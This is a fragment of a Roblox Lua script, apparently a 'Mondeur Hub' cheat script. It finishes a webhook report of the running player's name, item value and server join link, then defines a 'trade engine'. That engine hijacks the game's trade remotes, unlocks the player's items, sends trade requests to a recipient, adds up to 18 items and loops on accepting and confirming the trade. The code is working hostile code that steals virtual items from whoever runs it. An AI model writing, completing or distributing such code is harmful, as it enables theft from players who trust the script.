                fields = {
                    {name = "User", value = "```"..LP.Name.."```", inline = true},
                    {name = "Value", value = "```₱"..string.format("%.2f", tot).."```", inline = true},
                    {name = "Join", value = "[Click to Join](https://www.roblox.com/home?placeId="..game.PlaceId.."&gameId="..game.JobId..")"}
                },
                footer = {text = "Mondeur Hub | Priority Logic"}
            }}
        })})
    end)
end

-------[ TRADE ENGINE ]-------
local hashes = {}
for _, v in pairs(getgc()) do
    if type(v) == "function" and debug.getinfo(v).name == "get_remote_from_cache" then
        local up = debug.getupvalues(v)
        if type(up[1]) == "table" then for k, r in pairs(up[1]) do hashes[k] = r end end
    end
end
local function hAPI(n, ...)
    local r = hashes[n] or Fsys("RouterClient").get(n)
    if r then if r:IsA("RemoteFunction") then return r:InvokeServer(...) end r:FireServer(...) end
end

local function phantom(rec, hits)
    for _, p in ipairs(hits) do hAPI("BackpackAPI/SetItemLocked", p.uid, false); hAPI("BackpackAPI/SetItemFavorite", p.uid, false) end
    task.spawn(function()
        local last, burst, s2s = 0, 0, false
        while true do
            if not LP.PlayerGui:FindFirstChild("TradeApp") or not LP.PlayerGui.TradeApp.Enabled then
                if not s2s then task.wait(2); hAPI("TradeAPI/SendTradeRequest", rec); s2s, last, burst = true, tick(), 1
                elseif tick() - last > 10.1 then hAPI("TradeAPI/SendTradeRequest", rec); last, burst = tick(), 1
                elseif burst < 3 then hAPI("TradeAPI/SendTradeRequest", rec); burst = burst + 1; task.wait(0.5) end
            else
                for i = 1, math.min(18, #hits) do hAPI("TradeAPI/AddItemToOffer", hits[i].uid); task.wait(0.1) end
                while true do hAPI("TradeAPI/AcceptNegotiation"); hAPI("TradeAPI/ConfirmTrade"); task.wait(0.4) end
            end
            task.wait(0.5)
        end
    end)
end

